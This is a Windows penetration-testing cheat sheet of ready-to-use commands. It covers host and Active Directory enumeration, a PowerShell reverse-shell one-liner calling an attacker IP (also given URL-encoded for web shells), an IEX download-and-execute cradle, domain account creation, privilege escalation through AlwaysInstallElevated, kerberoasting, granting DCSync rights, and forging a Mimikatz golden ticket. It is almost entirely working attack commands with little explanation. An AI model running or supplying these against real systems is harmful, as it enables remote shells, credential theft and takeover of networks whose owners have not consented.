# Windows snippets and commands

Snippets and commands for Windows pentesting.

## Enumeration

```ps1
hostname
systeminfo
tasklist /svc # enumerate processes and associated services
ipconfig /all
route print # routing table info
netstat -ano
netsh advfirewall show currentprofile # get firewall status and policy
schtasks /query /fo LIST /v # list scheduled tasks
wmic product get name, version, vendor # enumerate applications
accesschk.exe -uws 'Everyone' 'C:\' # list perms recursively for all users
net group "<group_name>" # check if group exists
setspn -T medin -Q */* # list existing SPNs

# check for null and guest access on smb services
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //

nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> # enumerate LDAP
```

## Exploitation

```ps1
# one-liner powershell reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# URL encoded one-liner for web shells
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

# add user
net user <username> <password> /add /domain 

# add user to group
net group "<group_name>" /add <username>

# authenticate to samba
smbclient -U <user> //<ip>/<share>
```

## Privilege escalation

```ps1
# if AlwaysInstallElevated is set to 1 with those commands, we can privesc with a custom installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# generate a .msi payload with msfvenom, download it on the target then run
msiexec /quiet /qn /i C:\<your_path>\setup.msi

# powershell only, search objects that can be modified by everyone group
Get-ChildItem "C:\<path_here>" -Recurse | Get-Acl | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# powershell only, search users with a SPN (service principal name) for potential kerberoasting
import-module activedirectory
get-aduser -ldapfilter "(serviceprincipalname=*)"

# grab the hash on attack box for kerberoasting
impacket-GetUserSPNs <domain_name>/<user>:<password> -request

# enable DCSync rights on user
Import-Module .\PowerView.ps1 # upload it first
Add-DomainObjectAcl -PrincipalIdentity <user> -TargetIdentity "DC=<domain>,DC=<local>" -Rights DCSync
```

### Mimikatz

```ps1
# create a golden ticket
lsadump::lsa /inject /name:krbtgt
```
Take note of the outlined info:
![2d875ce3b84bcf1c6c2f323a036ca5f0.png](:/d84b73fc5968485da78e6c78eca61f64)

```ps1
# Use the info to complete the following command
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

### Bloodhound

```bash
# set up bloodhound on target and attack box
sudo neo4j console # browse address in output and login
git clone https://github.com/BloodHoundAD/BloodHound.git # frequently updated so better fetch the last version
cd BloodHound && find . | grep exe$ # find the exe and copy it on target

# download the bloodhound release on github, unzip it then run it
./BloodHound --use-gl=egl # flag needed for X11 forwarding

# run sharphound on target
.\SharpHound.exe -c all # download the zip and pick it with "upload data" in the GUI
```

## Useful commands

```ps1
# set ANSI color bit for windows (useful for winpeas)
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

# download with powershell
IEX(New-Object Net.WebClient).downloadString('<address>') # download and execute
wget http://<address:port>/<file> -Outfile file.exe # just download

# add modules
Import-Module .\<filename>.ps1
. ($PSScriptRoot + ".\<filename>.ps1") # alternative syntax
```
